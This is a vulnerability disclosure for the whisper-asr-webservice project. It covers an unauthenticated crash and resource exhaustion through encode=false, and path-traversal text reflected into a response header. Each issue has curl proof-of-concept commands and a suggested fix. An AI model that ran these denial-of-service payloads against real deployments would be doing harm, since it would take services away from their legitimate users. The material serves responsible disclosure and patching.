> [!CAUTION]
> **Advisory 1 of 2** — Unauthenticated Resource Exhaustion / Crash via `encode=false`

| | |
|---|---|
| **Project** | [ahmetoner/whisper-asr-webservice](https://github.com/ahmetoner/whisper-asr-webservice) |
| **Versions** | v1.9.1 · main @ `ddc8a99` (1.10.0-dev) |
| **Endpoints** | `POST /asr` · `POST /detect-language` |
| **Reporter** | [@llmgod](https://x.com/llmgod) |
| **Severity** | **HIGH** — CVSS 3.1 `AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` (~7.5) |
| **CWE** | Missing input validation · Uncapped resource consumption |

---

### What's happening

When `encode=false` is passed to `/asr` or `/detect-language`, FFmpeg is skipped entirely. Raw upload bytes go directly into `np.frombuffer(data, np.int16)` and then into Whisper — no authentication, no size limit, no format check.

Any unauthenticated caller can:
- **Crash the worker** with a single 1-byte request (odd-length buffer → unhandled `ValueError`)
- **Exhaust GPU/CPU** by uploading large payloads — int16→float32 conversion quadruples in-process footprint
- **Pin all workers** with a handful of concurrent large uploads, blocking legitimate requests

---

### Root cause

**`app/utils.py:124–127`**

```python
else:
    out = file.read()          # ← unbounded read, no size check

return np.frombuffer(out, np.int16).flatten().astype(np.float32) / 32768.0
#      ↑ raises ValueError if len(out) % 2 != 0
```

Both endpoints share this path via `load_audio()` (`app/utils.py:97`).

---

### Proof of concept

**1 — Crash on `/asr` (odd-length buffer)**
```bash
printf 'A' | curl -s -o /dev/null -w '%{http_code}\n' -X POST \
  "http://TARGET:9000/asr?encode=false&output=json" \
  -F "audio_file=@-;type=audio/wav"
# → 500   ValueError: buffer size must be a multiple of element size
```

**2 — Crash on `/detect-language` (same root cause)**
```bash
printf 'A' | curl -s -o /dev/null -w '%{http_code}\n' -X POST \
  "http://TARGET:9000/detect-language?encode=false" \
  -F "audio_file=@-;type=audio/wav"
# → 500   ValueError: buffer size must be a multiple of element size
```

**3 — Arbitrary binary accepted as audio**
```bash
curl -s -X POST "http://TARGET:9000/asr?encode=false&task=transcribe&language=en&output=json" \
  -F "audio_file=@/usr/bin/python3;type=audio/wav"
# → 200   {"text": " Thank you for watching!"}  ← hallucinated from ELF binary
```

**4 — Memory amplification**
```bash
dd if=/dev/urandom bs=1M count=100 2>/dev/null | curl -s -X POST \
  "http://TARGET:9000/asr?encode=false&output=json" \
  -F "audio_file=@-;type=audio/wav"
# 100 MB upload → ~400 MB process memory
```

**5 — Parallel worker exhaustion**
```bash
for i in $(seq 1 10); do
  dd if=/dev/urandom bs=1M count=50 2>/dev/null | curl -s -X POST \
    "http://TARGET:9000/asr?encode=false&output=json" \
    -F "audio_file=@-;type=audio/wav" &
done; wait
# all uvicorn workers pinned — legitimate requests time out
```

---

### Suggested fixes

**Option A — FastAPI size limit (one line)**
```python
audio_file: UploadFile = File(..., max_length=10 * 1024 * 1024)
```

**Option B — Validate in `load_audio()` before `np.frombuffer`**
```python
else:
    out = file.read()
    if len(out) > MAX_RAW_PCM_BYTES:
        raise ValueError("Payload exceeds raw PCM size limit")
    if len(out) % 2 != 0:
        raise ValueError("Raw PCM must have even byte length")
```

**Option C** — Remove `encode=false` from the public API entirely, or gate it behind authentication. It exists specifically to skip the validation FFmpeg would otherwise provide.

---
---

> [!WARNING]
> **Advisory 2 of 2** — Content-Disposition Header Reflection via Unsanitized Filename

| | |
|---|---|
| **Project** | [ahmetoner/whisper-asr-webservice](https://github.com/ahmetoner/whisper-asr-webservice) |
| **Versions** | v1.9.1 · main @ `ddc8a99` (1.10.0-dev) |
| **Endpoint** | `POST /asr` (all output formats) |
| **Reporter** | [@llmgod](https://x.com/llmgod) |
| **Severity** | **LOW** — CVSS 3.1 `AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N` (~4.3) |
| **CWE** | Unsanitized output encoding · Path traversal in response header |

---

### What's happening

`Content-Disposition` is built with `quote(audio_file.filename)` using the default `safe='/'`, which leaves `/` unencoded. A client-supplied filename with path traversal sequences passes verbatim into the response header.

> [!NOTE]
> This is **header reflection only** — no file-system read/write demonstrated. Reported as a hardening issue: unescaped path separators in a reflected header can mislead HTTP clients, logging pipelines, and proxies that parse `Content-Disposition` naively.

---

### Root cause

**`app/webservice.py`**

```python
"Content-Disposition": f'attachment; filename="{quote(audio_file.filename)}.{output}"'
#                                                ^^^^^^^^^^^^^^^^^^^^^^^^^ safe='/' by default
```

---

### Proof of concept

```bash
curl -s -D - -X POST "http://TARGET:9000/asr?encode=true&output=json" \
  -F "audio_file=@/dev/null;filename=../../../etc/passwd;type=audio/wav" \
  | grep -i disposition
```

```
Content-Disposition: attachment; filename="../../../etc/passwd.json"
```

---

### Suggested fix

```python
# Before
"Content-Disposition": f'attachment; filename="{quote(audio_file.filename)}.{output}"'

# After — encode / as %2F
"Content-Disposition": f'attachment; filename="{quote(audio_file.filename, safe="")}.{output}"'
```

Defense in depth: also strip directory components with `os.path.basename()` before using any client-supplied filename in a header or log line.

---

**Disclosure notes**

- Both issues found on v1.9.1 and reproduced against main (`ddc8a99`).
- All PoCs run against a locally deployed instance — no production systems or third-party data accessed.
- Happy to verify a fix or retest once patched.

*Reported by [@llmgod](https://x.com/llmgod)*
